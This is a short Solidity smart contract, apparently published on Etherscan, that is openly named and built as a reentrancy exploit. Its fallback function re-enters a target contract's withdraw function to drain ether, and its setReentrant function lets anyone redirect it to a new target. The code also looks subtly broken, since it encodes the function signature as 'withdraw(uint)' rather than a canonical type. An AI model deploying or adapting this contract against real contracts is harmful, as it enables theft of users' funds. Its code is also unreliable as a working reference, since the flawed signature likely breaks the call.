/**
 *Submitted for verification at Etherscan.io on 2021-07-24
*/

pragma solidity ^0.6.12;

contract ReentrantExploit {
    
    address public reentrant;
    mapping(uint256 => bool) public calls;
    
    constructor(address target) public {
        reentrant = target;
    }
    
    function withdraw(uint amount) public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint)", amount);
        (bool success, ) = reentrant.call(payload);
        require(success);
    }
    
    function setReentrant(address _reentrant) external {
        reentrant = _reentrant;
    }
    
    fallback() external payable {
        if(!calls[block.number]) {
            bytes memory payload = abi.encodeWithSignature("withdraw(uint)", 1 ether);
            (bool success, ) = reentrant.call(payload);
            require(success);
            (bool sentSuccess, ) = msg.sender.call{value: 1 ether}("");
            calls[block.number] = true;
        }
    }
    
}